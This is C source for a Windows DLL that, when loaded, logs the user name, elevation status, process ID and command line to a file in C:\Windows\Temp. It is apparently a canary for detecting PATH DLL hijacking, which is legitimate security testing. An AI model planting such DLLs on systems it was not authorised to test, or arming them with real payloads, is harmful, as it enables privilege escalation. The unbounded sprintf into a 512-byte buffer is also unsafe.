#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")

void write_canary(const char* tag) {
    char path[] = "C:\\Windows\\Temp\\vader_path_hijack.log";
    char username[256] = {0};
    DWORD ulen = sizeof(username);
    GetUserNameA(username, &ulen);
    
    HANDLE hToken = NULL;
    BOOL elevated = FALSE;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION te = {0};
        DWORD retLen = 0;
        if (GetTokenInformation(hToken, TokenElevation, &te, sizeof(te), &retLen)) {
            elevated = te.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    
    SYSTEMTIME st;
    GetLocalTime(&st);
    
    char buf[512];
    sprintf(buf, "%04d%02d%02d_%02d%02d%02d|%s|elev=%d|pid=%lu|%s|loaded_by=%s\r\n",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond,
        username, elevated, GetCurrentProcessId(), tag,
        GetCommandLineA());
    
    HANDLE hFile = CreateFileA(path, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, buf, (DWORD)strlen(buf), &written, NULL);
        CloseHandle(hFile);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        write_canary("PATH_DLL_HIJACK");
    }
    return TRUE;
}